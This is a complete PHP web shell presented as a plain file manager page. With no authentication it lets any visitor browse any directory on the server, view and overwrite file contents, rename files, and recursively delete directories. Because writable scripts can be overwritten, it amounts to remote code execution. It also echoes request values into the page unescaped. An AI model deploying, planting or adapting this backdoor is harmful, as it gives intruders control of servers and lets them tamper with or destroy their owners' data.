<title><?= get_current_user() ?></title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style type="text/css">
	@import url('https://fonts.googleapis.com/css?family=Ubuntu+Mono&display=swap');
	body {
		font-family: 'Ubuntu Mono', monospace;
		color: #8a8a8a;
	}
	table {
		background: #fff;
		box-shadow: 0px 0px 0px 6px rgba(222,222,222,0.73);
		border-top: 0px solid #fff;
		border-bottom: 20px solid #fff;
		border-right: 20px solid #fff;
		border-left: 20px solid #fff;
		border-radius:10px;
		border-spacing:0;
	}
	th {
		padding:12px;
		font-weight: normal;
	}
	td {
		padding:5px;
		border:none;
	}
	td.no-border {
		border:none;
	}
	button {
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		background:none;
		border:none;
	}
	button:focus {
		outline:none;
	}
	select:focus, 
	input:focus,
	textarea:focus {
		outline:none;
	}
	button:hover {
		cursor:pointer;
	}
	textarea {
		font-family: 'Ubuntu Mono', monospace;
		width:100%;
		color: #8a8a8a;
		height:350px;
		resize:none;
		border:2px solid rgba(222,222,222,0.73);
		border-radius:5px;
	}
	select {
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		content: "";
		padding:4px;
		background: #fff;
		border-top: none;
		border-left: none;
		border-right: none;
		border-bottom:2px solid rgba(222,222,222,0.73);
	}
	input[type=text] {
		width:100%;
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		content: "";
		padding:4px;
		background: #fff;
		border-radius:5px;
		border:2px solid rgba(222,222,222,0.73);
	}
	input[type=submit] {
		width:100%;
		color: #8a8a8a;
		font-family: 'Ubuntu Mono', monospace;
		content: "";
		padding:7px;
		background: #fff;
		border-radius:5px;
		border:2px solid rgba(222,222,222,0.73);
	}
	input[type=submit]:hover {
		cursor: pointer;
		border:2px solid #ff9696;
	}
	span.action {
		font-size:30px;
	}
	.icon {
		width:25px;
		height:25px;
	}
	td.icon {
		width:10px;
	}
	::-moz-selection {
		color: #fff;
		background: #ffadad;
	}
	::selection {
		color: #fff;
		background: #ffadad;
	}
</style>
<table align="center" width="60%">
<?php
date_default_timezone_set('Asia/Jakarta');
function cwd() {
	if (isset($_POST['dir'])) {
		$cwd = $_POST['dir'];
		chdir($cwd);
	} else {
		$cwd = str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
	} return $cwd;
}
function alert($type, $msg) {
	?>
	<tr>
		<td>
			<div class="alert <?=$type?>">
				<span class="<?=$type?>">
					<?= $msg ?>
				</span>
			</div>
		</td>
	</tr>
	<?php
}
class Files {
	public $path;
    public $options;
    public $filesystem;
    public $directories;
    public $files;
    public $text;

    function pwd() {
    	$dir = explode(DIRECTORY_SEPARATOR, cwd());
    	foreach ($dir as $key => $pwd) {
    		print("<button name='dir' value='");
    		for ($i=0; $i <= $key ; $i++) { 
    			print($dir[$i]);
    			if ($i != $key) {
    				print(DIRECTORY_SEPARATOR);
    			}
    		} print("'>{$pwd}</button>");
    	}
    }

    function permission_file($filename, $perms) {
    	if (is_writable($filename)) {
    		?> <font color="green"><?= $perms ?></font> <?php
    	} else {
    		?> <font color="red"><?= $perms ?></font> <?php
    	}
    }

    function permission($filename) {
    	if (is_writable($filename)) {
    		?> <font color="green">writable</font> <?php
    	} else {
    		?> <font color="red">not writable</font> <?php
    	}
    }

    function size($file) {
    	$this->discovery($file);

    	if (is_file($file)) {
    		$filePath = $file;
            if (!realpath($filePath)) {
              $filePath = $_SERVER["DOCUMENT_ROOT"].$filePath;
            }
            $fileSize = filesize($filePath);
            $sizes = array("TB","GB","MB","KB","Byte");
            $total = count($sizes);
            while ($total-- && $fileSize > 1024) {
            	$fileSize /= 1024;
            } return round($fileSize, 2)." ".$sizes[$total];
        } return false;
    }

    function img($filename) {
    	print("<img class='icon' src='");
    	$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    	switch ($ext) {
    		case 'php':
    		case 'php1':
    		case 'php2':
    		case 'php3':
    		case 'php4':
    		case 'php5':
    		case 'php6':
    		case 'phtml':
    			print("https://image.flaticon.com/icons/png/128/337/337947.png");
    			break;
    		case 'html':
    			print("https://image.flaticon.com/icons/png/128/136/136528.png");
    			break;
    		case 'pdf':
    			print("https://image.flaticon.com/icons/png/128/136/136522.png");
    			break;
    		case 'css':
    			print("https://image.flaticon.com/icons/png/128/136/136527.png");
    			break;
    		case 'ico':
    			print("https://image.flaticon.com/icons/png/128/1126/1126873.png");
    			break;
    		case 'png':
    			print("https://image.flaticon.com/icons/png/128/136/136523.png");
    			break;
    		default:
    			print("https://image.flaticon.com/icons/svg/833/833524.svg");
    			break;
    	} print("'></img>");
    }

	function delete($path) {
		if (file_exists($path)) {
		} else {
			return;
		}

		$this->discovery($path);
		if (count($this->files) > 0) {
			foreach ($this->files as $file) {
				unlink($file);
			}
		}
		if (count($this->directories) > 0) {
			arsort($this->directories);

			foreach ($this->directories as $directory) {
				if (basename($directory) == '.' || basename($directory) == '..') {
				} else {
					rmdir($directory);
				}
			}
		} return;
	}

	function edit($path, $text)  {
    	$this->discovery($path);

    	if (is_file($path)) {
    		$handle = fopen($path, "w");
    		fwrite($handle, $text);
    		fclose($handle);
    	}
    }

    function renames($filename, $newname) {
    	$this->discovery($filename);
    	return rename($filename, $newname);
    }

	function discovery($path) {
        $this->directories = array();
        $this->files       = array();

        if (is_file($path)) {
            $this->files[] = $path;
            return;
        }

        if (is_dir($path)) {
        } else {
            return;
        }

        $this->directories[] = $path;
        $objects = new RecursiveIteratorIterator (
            new RecursiveDirectoryIterator($path),
            RecursiveIteratorIterator::SELF_FIRST);

        foreach ($objects as $name => $object) {
            if (is_file($name)) {
                $this->files[] = $name;
            } elseif (is_dir($name)) {
                if (basename($name) == '.' || basename($name) == '..') {
                } else {
                    $this->directories[] = $name;
                }
            }
        } return;
    }
}
$file = new Files();
switch (@$_POST['action']) {
	case 'rename':
		if (isset($_POST['newname'])) {
			$rename = $file->renames($_POST['file'], $_POST['newname']);
			if ($rename) {
				alert("success", "rename success");
			} else {
				alert("failed", "rename failed");
			}
			$_POST['name'] = $_POST['file'];
		}
		switch ($_POST['file']) {
			case @filetype($_POST['file']) == 'dir' :
				?>
				<tr>
					<th colspan="4">
						<span class="action">RENAME</span>
					</th>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Filename
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Last Update
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
								<option value="rename" selected><span>&#9998;</span>&nbsp;  RENAME</option>
							</select>
							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<input type="text" name="newname" value="<?= $_POST['name'] ?>">
						</td>
						<td class="no-border" colspan="3">
							<input type="submit">
							<input type="hidden" name="action" value="rename">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
				<?php
				break;
			
			case @filetype($_POST['file']) == 'file' :
				?>
				<tr>
					<th colspan="4">
						<span class="action">RENAME</span>
					</th>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Filename
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<td class="no-border" style="width:100px;">
						Last Update
					</td>
					<td class="no-border"><center>:</center></td>
					<td class="no-border">
						<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
					</td>
				</tr>
				<tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option value="back"><span>&#8592;</span>&nbsp; BACK</option>
								<option value="edit"><span>&#9997;</span>&nbsp; EDIT</option>
								<option value="delete"><span>&#10006;</span>&nbsp; DELETE</option>
								<option value="rename" selected><span>&#9998;</span>&nbsp;  RENAME</option>
							</select>
							<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
					<form method="post">
						<td class="no-border" colspan="3">
							<input type="text" name="newname" value="<?= $_POST['file'] ?>">
						</td>
						<td class="no-border" colspan="3">
							<input type="submit" name="submit">
							<input type="hidden" name="action" value="rename">
							<input type="hidden" name="file" value="<?=$_POST['file']?>">
						</td>
					</form>
				</tr>
				<?php
				break;
		}
		exit();
		break;
	case 'edit':
		?>
		<tr>
			<th colspan="3">
				<span class="action">EDIT</span>
			</th>
		</tr>
		<?php
		if (isset($_POST['submit'])) {
			$edit = $file->edit($_POST['file'], $_POST['text']);
			if ($edit) {
				$alert = alert("failed", "edit failed");
			} else {
				$alert = alert("success", "edit success");
			}
		}
		?>
		<tr>
			<td class="no-border" style="width:100px;">
				Filename
			</td>
			<td class="no-border"><center>:</center></td>
			<td class="no-border">
				<?= $file->permission_file($_POST['file'], basename($_POST['file'])) ?>
			</td>
		</tr>
		<tr>
			<td class="no-border" style="width:100px;">
				Last Update
			</td>
			<td class="no-border"><center>:</center></td>
			<td class="no-border">
				<?= date ("F d Y H:i:s.", filemtime($_POST['file'])) ?>
			</td>
		</tr>
		<tr>
			<form method="post">
				<td class="no-border" colspan="3">
					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option value="back">BACK</option>
						<option value="edit"selected>EDIT</option>
						<option value="delete">DELETE</option>
						<option value="rename">RENAME</option>
					</select>
					<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
					<input type="hidden" name="file" value="<?=$_POST['file']?>">
				</td>
			</form>
		</tr>
		<tr>
			<form method="post">
				<td class="no-border" colspan="3">
					<textarea name="text"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
				</td>
		</tr>
		<tr>
			<td class="no-border" colspan="3">
				<input type="submit" name="submit" value="EDIT">
				<input type="hidden" name="action" value="edit">
				<input type="hidden" name="file" value="<?=$_POST['file']?>">
			</td>
		</tr>
		</form>
		<?php
		exit();
		break;
	case 'delete':
		$file->delete($_POST['file']);
		break;
	case 'back':
		if (isset($_POST['dirs'])) {
			chdir(str_replace(basename($_POST['file']), '', $_POST['file']));
		}
		?>
		<input type="hidden" name="dirs" value="<?= $_POST['dirs'] ?>">
		<?php
		break;
}
?>
<tr>
	<form method="post">
		<th colspan="6">
			<?= $file->pwd() ?> ( <?= $file->permission(cwd()) ?> )
		</th>
	</form>
</tr>
<?php
$iterator = new DirectoryIterator(cwd());
foreach ($iterator as $dir) {
	if ($dir->isDir() && $dir != '.' && $dir != '..') {
		?>
		<tr>
			<td>
				<input type="checkbox" name="data[]" value="<?= $dir->getPathname() ?>">
			</td>
			<td class="icon">
				<img src="https://image.flaticon.com/icons/svg/716/716784.svg" class="icon">
			</td>
			<form method="post">
			<td>
				<button name="dir" value="<?=cwd().DIRECTORY_SEPARATOR.$dir->getFilename()?>">
					<?= basename($dir->getPathname()) ?>
				</button>
			</td>
			</form>
			<td>
				<center>
					<?= @$dir->getType() ?>
				</center>
			</td>
			<td>
				<center>
					<?= $file->permission($dir) ?>
				</center>
			</td>
			<form method="post">
				<td>
					<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
						<option selected>CHOOSE . .</option>
						<option value="delete">DELETE</option>
						<option value="rename">RENAME</option>
					</select>
					<input type="hidden" name="file" value="<?= $dir->getPathname() ?>">
					<input type="hidden" name="dirs" value="<?= cwd() ?>">
				</td>
			</form>
		</tr>
		<?php
	}
}
foreach ($iterator as $files) {
	if ($files->isFile()) {
		?>
		<tr>
			<td style="width:1%;">
				<input type="checkbox" name="data[]" value="<?= $files->getPathname() ?>">
			</td>
			<td class="icon">
				<?= $file->img($files->getPathname()) ?>
			</td>
			<td>
				<a href="http://<?=$_SERVER['HTTP_HOST'].str_replace($_SERVER['DOCUMENT_ROOT'], '', cwd()).DIRECTORY_SEPARATOR.basename($files->getPathname())?>" target='_blank'>
					<button><?=basename($files->getPathname())?></button>
				</a>
			</td>
			<td>
				<center>
					<?=$file->size($files)?>
				</center>
			</td>
			<td>
				<center>
					<?= $file->permission($files) ?>
				</center>
			</td>
			<form method="post">
				<td>
					<?php
					$exttension = strtolower(pathinfo($files->getPathname(), PATHINFO_EXTENSION));
					switch ($exttension) {
						case 'png':
						case 'jpg':
						case 'jpeg':
						case 'gif':
						case 'bmp':
						case 'ico':
							?>
							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option selected>CHOOSE . .</option>
								<option value="delete">DELETE</option>
								<option value="rename">RENAME</option>
							</select>
							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
							<input type="hidden" name="dirs" value="<?= cwd() ?>">
							<?php
							break;
						
						default:
							?>
							<select name="action" onchange='if(this.value != 0) { this.form.submit(); }'>
								<option selected>CHOOSE . .</option>
								<option value="edit">EDIT</option>
								<option value="delete">DELETE</option>
								<option value="rename">RENAME</option>
							</select>
							<input type="hidden" name="file" value="<?= $files->getPathname() ?>">
							<input type="hidden" name="dirs" value="<?= cwd() ?>">
							<?php
							break;
					}
					?>
				</td>
			</form>
		</tr>
		<?php
	}
}
?>
</table>
